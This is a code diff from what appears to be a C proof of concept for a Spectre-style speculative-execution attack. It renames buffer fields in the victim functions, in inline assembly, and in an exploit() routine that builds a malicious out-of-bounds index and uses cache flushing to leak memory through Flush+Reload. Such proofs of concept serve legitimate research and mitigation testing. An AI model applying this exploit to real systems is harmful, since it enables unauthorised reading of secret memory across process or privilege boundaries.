@@ -39,7 +39,7 @@ void victim(size_t malicious_x) {
     x = malicious_x;
     flush_pipeline;
     x = buffer.x;
-    temp &= buffer.array2[buffer.array1[x] * CACHE_PAGE];
+    temp &= buffer.table[buffer.indices[x] * CACHE_PAGE];
 }
 
 /**
@@ -61,13 +61,13 @@ void victim_asm(size_t malicious_x) {
         "lea %4, %%rbx\n"
         "mov (%%rbx,%%rax), %%rax\n"
         : "=m"(x)
-        : "m"(malicious_x), "m"(buffer.x), "m"(buffer.array1), "m"(buffer.array2)
+        : "m"(malicious_x), "m"(buffer.x), "m"(buffer.indices), "m"(buffer.table)
         : "rax","rbx","rcx","rdx","memory");
 }
 
 size_t exploit(size_t address, int tries) {
-    size_t malicious_x = address - (size_t)buffer.array1;   // Set a malicious (speculative) array index
-    buffer.x = tries % buffer.array1_size;                  // Set a valid array index
+    size_t malicious_x = address - (size_t)buffer.indices;  // Set a malicious (speculative) array index
+    buffer.x = tries % buffer.indices_size;                 // Set a valid array index
     
     _mm_clflush(&buffer.x);     // Flush the valid index from cache to force speculative store
     flush_pipeline;
@@ -79,7 +79,7 @@ size_t exploit(size_t address, int tries) {
 #endif
     
     // Return the valid index to exclude it from Flush+Reload test
-    return buffer.array1[buffer.x];
+    return buffer.indices[buffer.x];
 }
 
 int main(int argc, const char **argv) {
